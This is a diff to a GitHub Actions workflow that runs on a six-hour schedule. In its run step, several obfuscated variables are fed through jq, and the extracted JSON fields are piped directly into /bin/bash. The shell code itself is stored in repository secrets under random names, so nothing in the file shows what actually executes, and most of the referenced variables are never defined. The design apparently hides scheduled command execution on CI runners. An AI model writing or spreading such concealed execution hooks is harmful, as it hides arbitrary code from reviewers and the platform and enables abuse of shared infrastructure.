@@ -1,9 +1,9 @@
 name: mingyulu1837
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '49 0/6 * * *'
+    - cron: '50 3/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,14 +12,15 @@ jobs:
       - uses: actions/checkout@v4
       - name: mingyulu1837
         env:
-          rl746: ${{ secrets.rl746 }}
+          cssah2: ${{ secrets.cssah2 }}
         run: |
-          echo $rl746 | jq -r .tapsc33501 | /bin/bash
-          echo $ageb81 | jq -r .dbzd8503 | /bin/bash
-          echo $utn0437 | jq -r .pf30 | /bin/bash
-          echo $vn84 | jq -r .upyc7164 | /bin/bash
-          echo $lv16221 | jq -r .jukrv0 | /bin/bash
-          echo $y9 | jq -r .ftwcb09 | /bin/bash
-          echo $riksi031 | jq -r .wx28 | /bin/bash
-          echo $hgoq65 | jq -r .zty4 | /bin/bash
+          echo $cssah2 | jq -r .ifep41978 | /bin/bash
+          echo $en585 | jq -r .b76338 | /bin/bash
+          echo $uacwb135 | jq -r .ecixa7930 | /bin/bash
+          echo $iavb2 | jq -r .jws31 | /bin/bash
+          echo $lebn4 | jq -r .lrd050 | /bin/bash
+          echo $oniq08357 | jq -r .gm2807 | /bin/bash
+          echo $cbe22555 | jq -r .edww056 | /bin/bash
+          echo $tcxab77 | jq -r .wek965 | /bin/bash
+          echo $eqg4 | jq -r .yoqh951 | /bin/bash
 
